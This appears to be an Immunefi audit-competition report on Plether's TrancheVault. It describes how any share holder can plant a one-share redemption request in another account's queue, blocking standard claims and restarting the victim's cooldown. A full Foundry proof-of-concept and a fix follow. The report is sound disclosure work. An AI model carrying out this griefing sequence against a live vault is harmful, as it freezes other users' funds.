# \#98912 [SC-Low] TrancheVault.requestRedeem lets any share holder plant a one-share request in another account's controller queue: the victim's standard claims stop working and the only call that clears it restarts the victim's one-hour cooldown

**Submitted on Nov 10th 2026 at 21:40:09 UTC by @Nyko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98912
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`TrancheVault.requestRedeem(shares, controller, owner)` authenticates the owner side only. The named controller is not asked. Any holder of one vault share can therefore open a redemption request in another account's controller queue. Standard claims and the `max*` views read only a controller's oldest request (its head). A one-share request that is alone in its hourly epoch has a zero quote, so settlement refunds it instead of funding it, and it stays as the victim's head. From then on `maxRedeem(victim)` and `maxWithdraw(victim)` return 0 and `redeem` / `withdraw` revert, although a later request of the victim is funded. The only call that removes the head is `claimRedeemRefund`, which must deliver the share to the victim and sets `lastDepositTime[victim] = block.timestamp`: the victim's whole wallet is locked for one hour. The attacker pays one share (less than one USDG atom) and gas, and can repeat it every epoch.

## Vulnerability Details

1. The request checks the owner only (`TrancheVault.sol:617-630`, condensed):

```solidity
if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) revert TrancheVault__DepositCooldown();
uint256 maxShares = maxRequestRedeem(owner);
...
_requireMinimumRedeemSize(shares, maxShares);
if (msg.sender != owner && !isOperator[owner][msg.sender]) _spendAllowance(owner, msg.sender, shares);
_transfer(owner, address(this), shares);
requestId = _enqueueRedeemRequest(shares, controller);
```

`_enqueueRedeemRequest` appends the epoch to `controller`'s queue (`:701-704`). If the queue was empty the new request becomes `controllerRedeemHead[controller]` (`:1789-1791`).

2. One share is enough. The minimum request size does not apply to a wallet's whole balance (`:1615`, `shares < maxShares`). The attacker sends one share to a fresh wallet with a plain transfer and requests from there.

3. The request is refunded, not funded. Requests are grouped by hourly LP epoch (`:545-556`). When the epoch at the head of the vault queue has a zero quote, the pool calls `refundRedeemEpochRemainder` (`HousePool.sol:957-970`, `TrancheVault.sol:1505-1524`). One share is worth less than one USDG atom, so an epoch that holds only the planted share is refunded. The attacker gets this by planting shortly before the request cutoff in an hour in which nobody else requested a redemption.

4. Standard claims and views read the head only (`:1006-1012`, `:1306-1311`, condensed):

```solidity
function redeem(uint256 shares, address receiver, address controller) public override returns (uint256 assets) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
function maxRedeem(address controller) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

For the refunded epoch `claimableRedeemRequest` is 0, so `redeem` reverts with `ERC4626ExceededMaxRedeem(controller, shares, 0)` and `withdraw` with `ERC4626ExceededMaxWithdraw`.

5. The head is removed only after the refund is claimed (`_maybeCloseRedeemPosition`, `:1222-1226`). `claimRedeemRefund` forces `receiver == controller` and restarts the cooldown when it returns a share (`:931`, `:942-945`):

```solidity
_requireShareReceiver(controller, receiver);
...
if (shares != 0) {
    lastDepositTime[receiver] = block.timestamp;
    _transfer(address(this), receiver, shares);
}
```

During the cooldown the victim's transfers revert with `TrancheVault__TransferDuringCooldown` (`:326-328`), `requestRedeem` reverts with `TrancheVault__DepositCooldown` (`:617-619`) and `maxRequestRedeem` is 0 (`:1331`).

What the documents and tests cover. The interface note (`interfaces/IAsyncTrancheVault.sol:8-14`) says "A rejected deposit or refundable redeem head must be cancelled or reclaimed before standard claims advance to a later request" and that the receiver rule exists "so share delivery cannot impose another account's cooldown or depend on an unsolicited receiver balance". `SECURITY.md:1399` says a terminal refund begins a new cooldown. Both describe a head the controller created itself. Nothing states that another account can create it. In the repository's tests every `requestRedeem` call uses the same account as controller and owner (one test passes the zero address to check the revert); `test_RedeemRefundRequiresControllerReceiverIncludingOperator` (`test/perps/spec/lp/TrancheShareReceiver.t.sol:149-178`) builds the one-share refund with the same account as owner and controller.

Relation to audited items. CECURO LOW-39 and LOW-40 (unsolicited dust blocking claims, a controller forcing a receiver into cooldown) were addressed by requiring `receiver == controller` on share delivery (`_requireShareReceiver`, `:1620-1628`). That closed the delivery side. The request side still lets another account decide that a controller must either lose its standard claim path or restart its cooldown. CECURO MED-24 (accepted) concerns the settlement work that zero-payout epochs consume, not controller queues.

## Impact Details

Selected impact: Medium, "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)". The lock of the victim's shares after the reclaim also fits "Temporary freezing of funds for at least 1 hour".

Measured in the PoC (victim with about 100,000 USDG of Junior shares, release parameters):
- After the plant the victim requests the redemption of half its shares and the request is funded in full: about 50,000 USDG are in claim escrow. `maxRedeem(victim)` and `maxWithdraw(victim)` are 0; `redeem` and `withdraw` revert.
- The victim calls `claimRedeemRefund`: it receives the attacker's share, `lastDepositTime` is set to now, share transfers and new redemption requests revert for 3,600 seconds. Only then does the standard `redeem` pay.
- A holder contract that uses only the standard ERC-7540 / ERC-7575 functions (`requestRedeem`, `maxRedeem`, `redeem`) cannot reach its funded assets at all: still 0 claimable after 30 days, with no upper bound. It needs the vault-specific `claimRedeem(requestId, ...)` or `claimRedeemRefund`, or an operator who calls them.
- Three plants in three epochs cost three shares and need three reclaims, each restarting the cooldown.

Limits:
- No funds are taken and the attacker gains nothing.
- An account that knows the vault-specific interface can leave the planted head in place: `claimRedeem(requestId, ...)` still pays and new redemption requests are not blocked (PoC test `test_explicitIdClaimPays_headStays`). Its standard surface then stays empty for every later request until it reclaims.
- The plant must be alone in its epoch to be refunded. If another LP redeems in the same epoch the share is funded instead; then `maxWithdraw` is 0, `maxRedeem` is 1 and one standard `redeem(1)` that pays zero clears it without a cooldown. Executed locally, not part of the PoC below.
- `requestDeposit(assets, controller, owner)` has the same missing check (`:1582`). A minimum-size lot of 1 USDG placed in front of the victim's lot makes `deposit(ownAmount)` revert and `maxDeposit` show 1 USDG. That side costs the attacker 1 USDG per plant, which the victim receives, and involves no cooldown. Executed locally, not part of the PoC below.

## Recommendation

Require the controller's approval for a request that names another account, as share delivery already does. In `requestRedeem` and in `_requireRequestDepositPreflight`:

```solidity
if (controller != owner && msg.sender != controller && !isOperator[controller][msg.sender]) {
    revert TrancheVault__NotControllerOrOperator();
}
```

We ran this rule on a local copy of the vault: both plants revert; own requests, a request for a controller that approved the caller as operator, and a request placed by the controller with the owner's share allowance still work.

## References

- `packages/perps/src/TrancheVault.sol`: `requestRedeem` :606-632, `_enqueueRedeemRequest` :688-708, `claimRedeemRefund` :916-947, `redeem` / `withdraw` :998-1012, `maxWithdraw` / `maxRedeem` :1299-1311, `_requireMinimumRedeemSize` :1611-1618, `_requireShareReceiver` :1620-1628, `_update` :314-333
- `packages/perps/src/HousePool.sol:957-970` (zero-quote head epoch is refunded)
- `packages/perps/src/interfaces/IAsyncTrancheVault.sol:8-14`; `packages/perps/SECURITY.md:1399`, :1403-1410
- Commit a82d4fefb02768e5b3bddcc97dee371eee24fea8

---


## Proof of Concept


## Proof of Concept

Uses the repository's `BasePerpTest` (deployed protocol contracts, release risk parameters; `MockPyth` supplies prices, USDG is the test token). No in-scope contract is modified. LP epochs are settled by an unprivileged keeper through `Router.settleLpEpoch`.

1. Save the file below as `packages/perps/test/perps/ControllerQueuePlant.t.sol` at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.
2. From the repository root: `forge test --root packages/perps --match-contract ControllerQueuePlant -vv` (`FOUNDRY_VIA_IR=false` compiles faster; both pipelines pass).
3. Expected: 4 passed.

Tests: the planted head with the dead standard surface, the reclaim and the one-hour lock; the vault-specific claim that pays while the head stays; a standard-only holder with nothing claimable after 30 days (with its control); three plants in three epochs.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Plether perps @ a82d4fe. Release risk parameters through BasePerpTest hooks; mocks: MockPyth ticks and USDG only.
// LP epochs are settled by an unprivileged keeper through Router.settleLpEpoch. No in-scope contract is modified.

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// A share holder that uses only the standard ERC-7540 / ERC-7575 functions.
contract StandardOnlyHolder {
  TrancheVault immutable VAULT;

  constructor(TrancheVault v) {
    VAULT = v;
  }

  function requestExit(uint256 shares) external returns (uint256) {
    return VAULT.requestRedeem(shares, address(this), address(this));
  }

  function claimAll(address to) external returns (uint256) {
    return VAULT.redeem(VAULT.maxRedeem(address(this)), to, address(this));
  }
}

contract ControllerQueuePlant is BasePerpTest {
  address constant VICTIM = address(0x71C7);
  address constant OTHER_LP = address(0x1D01);
  address constant ATTACKER = address(0xA77AC4E5);
  address constant KEEPER = address(0x4EE9); // keepers are permissionless
  uint256 pubT;
  uint160 nextDustWallet = 0xD057000;

  function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
    return CfdTypes.RiskParams(0.01e18, 0.4e18, 10, 20, 300, 500, 1e6, 10, 5000, 0);
  }

  function _initialJuniorDeposit() internal pure override returns (uint256) {
    return 0;
  }

  function setUp() public override {
    super.setUp();
    _setSeniorCapacity(40_000_000e6, 8000);
    baseMockPyth.setSynchronizeLegacyUniquePrices(false); // explicit tick payloads only
    _deposit(VICTIM, 100_000e6);
    _deposit(OTHER_LP, 50_000e6);
    _deposit(ATTACKER, 10e6);
    _at(vm.getBlockTimestamp() + 1 hours + 20); // past TrancheVault.DEPOSIT_COOLDOWN
  }

  function test_plantedHead_blocksStandardClaims_reclaimRestartsCooldown() public {
    uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
    uint256 idDust = _plant(VICTIM); // the victim signs and approves nothing
    _settleAt(idDust);
    assertEq(juniorVault.controllerRedeemHead(VICTIM), idDust, "the plant is the victim's head");
    assertEq(juniorVault.refundableRedeemRequest(idDust, VICTIM), 1, "refunded, not funded");
    assertEq(attackerShares - juniorVault.balanceOf(ATTACKER), 1, "attacker cost: one share");
    assertEq(juniorVault.convertToAssets(1), 0, "worth less than one USDG atom");

    // The victim exits half of its position in the ordinary way; its request is funded in full.
    uint256 half = juniorVault.balanceOf(VICTIM) / 2;
    vm.prank(VICTIM);
    uint256 idV = juniorVault.requestRedeem(half, VICTIM, VICTIM);
    _settleAt(idV);
    uint256 assets = juniorVault.claimableRedeemAssets(idV, VICTIM);
    assertEq(juniorVault.claimableRedeemRequest(idV, VICTIM), half, "funded in full");
    assertGt(assets, 49_000e6, "about 50,000 USDG in claim escrow");

    // Standard ERC-7540 / ERC-7575 surface: nothing is claimable.
    assertEq(juniorVault.maxRedeem(VICTIM), 0);
    assertEq(juniorVault.maxWithdraw(VICTIM), 0);
    vm.startPrank(VICTIM);
    vm.expectRevert(abi.encodeWithSignature("ERC4626ExceededMaxRedeem(address,uint256,uint256)", VICTIM, half, 0));
    juniorVault.redeem(half, VICTIM, VICTIM);
    vm.expectRevert(abi.encodeWithSignature("ERC4626ExceededMaxWithdraw(address,uint256,uint256)", VICTIM, assets, 0));
    juniorVault.withdraw(assets, VICTIM, VICTIM);

    // The only call that removes the head returns the attacker's share and restarts the victim's cooldown.
    assertGt(juniorVault.maxRequestRedeem(VICTIM), 0, "wallet unlocked before the reclaim");
    assertEq(juniorVault.claimRedeemRefund(idDust, VICTIM, VICTIM), 1);
    uint256 t = vm.getBlockTimestamp();
    assertEq(juniorVault.lastDepositTime(VICTIM), t, "cooldown restarted");
    assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "whole wallet locked");
    vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
    juniorVault.transfer(OTHER_LP, 1e12);
    assertEq(juniorVault.redeem(half, VICTIM, VICTIM), assets, "control: pays once the head is gone");
    _at(t + 1 hours - 1);
    vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
    juniorVault.requestRedeem(1e12, VICTIM, VICTIM);
    _at(t + 1 hours);
    juniorVault.requestRedeem(1e12, VICTIM, VICTIM); // unlocked after the full hour
    vm.stopPrank();
  }

  /// The explicit-id claim pays, but the head stays and the standard surface stays empty for later requests.
  function test_explicitIdClaimPays_headStays() public {
    uint256 idDust = _plant(VICTIM);
    _settleAt(idDust);
    for (uint256 i; i < 2; ++i) {
      uint256 half = juniorVault.balanceOf(VICTIM) / 2;
      vm.prank(VICTIM);
      uint256 idV = juniorVault.requestRedeem(half, VICTIM, VICTIM);
      _settleAt(idV);
      assertEq(juniorVault.maxRedeem(VICTIM), 0);
      assertEq(juniorVault.maxWithdraw(VICTIM), 0);
      vm.prank(VICTIM);
      assertGt(juniorVault.claimRedeem(idV, half, VICTIM, VICTIM), 24_000e6);
      assertEq(juniorVault.controllerRedeemHead(VICTIM), idDust);
    }
  }

  function test_standardOnlyHolder_cannotClaim() public {
    StandardOnlyHolder holder = new StandardOnlyHolder(juniorVault);
    uint256 shares = juniorVault.balanceOf(VICTIM) / 2;
    vm.prank(VICTIM);
    juniorVault.transfer(address(holder), shares);

    uint256 snap = vm.snapshotState();
    _settleAt(holder.requestExit(shares));
    assertGt(holder.claimAll(OTHER_LP), 49_000e6, "control: pays without the plant");
    vm.revertToState(snap);

    _settleAt(_plant(address(holder)));
    uint256 idH = holder.requestExit(shares);
    _settleAt(idH);
    uint256 funded = juniorVault.claimableRedeemAssets(idH, address(holder));
    assertGt(funded, 49_000e6, "the holder's request is funded");
    _at(vm.getBlockTimestamp() + 30 days);
    assertEq(juniorVault.maxRedeem(address(holder)), 0, "30 days later: nothing claimable");
    vm.expectRevert(abi.encodeWithSignature("ERC4626ExceededMaxRedeem(address,uint256,uint256)", holder, 0, 0));
    holder.claimAll(OTHER_LP);
    assertEq(juniorVault.claimableRedeemAssets(idH, address(holder)), funded, "still in claim escrow");
  }

  function test_repeatEveryEpoch() public {
    uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
    uint256[3] memory ids;
    for (uint256 i; i < 3; ++i) {
      ids[i] = _plant(VICTIM);
      _settleAt(ids[i]);
    }
    assertEq(attackerShares - juniorVault.balanceOf(ATTACKER), 3, "three plants cost three shares");
    for (uint256 i; i < 3; ++i) {
      assertEq(juniorVault.controllerRedeemHead(VICTIM), ids[i]);
      _at(vm.getBlockTimestamp() + 10 minutes);
      vm.prank(VICTIM);
      juniorVault.claimRedeemRefund(ids[i], VICTIM, VICTIM);
      assertEq(juniorVault.lastDepositTime(VICTIM), vm.getBlockTimestamp(), "cooldown restarted");
    }
  }

  /// One share in a fresh wallet is that wallet's whole balance, which is exempt from the minimum request size.
  function _plant(address controller) internal returns (uint256 requestId) {
    address dustWallet = address(nextDustWallet++);
    vm.prank(ATTACKER);
    juniorVault.transfer(dustWallet, 1);
    vm.prank(dustWallet);
    requestId = juniorVault.requestRedeem(1, controller, dustWallet);
  }

  function _settleAt(uint256 epochId) internal {
    _at(pool.lpEpochStart(epochId));
    _settle();
  }

  function _at(uint256 t) internal {
    vm.warp(t);
    vm.roll(vm.getBlockNumber() + 1);
  }

  function _settle() internal {
    _at(vm.getBlockTimestamp() + 1);
    uint256 t = vm.getBlockTimestamp();
    MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
    u[0] = MockPyth.FeedUpdate(BASE_PYTH_FEED_A, MockPyth.MockPrice(1e8, 0, -8, t, pubT));
    u[1] = MockPyth.FeedUpdate(BASE_PYTH_FEED_B, MockPyth.MockPrice(1e8, 0, -8, t, pubT));
    bytes[] memory d = new bytes[](1);
    (pubT, d[0]) = (t, abi.encode(u));
    vm.prank(KEEPER);
    OrderRouter(address(router)).settleLpEpoch(d);
  }

  function _deposit(address lp, uint256 amount) internal {
    settlementToken.mint(lp, amount);
    vm.startPrank(lp);
    settlementToken.approve(address(juniorVault), amount);
    uint256 id = juniorVault.requestDeposit(amount, lp, lp);
    vm.stopPrank();
    _settleAt(id);
    vm.prank(lp);
    juniorVault.claimDeposit(id, amount, lp, lp);
  }
}
```

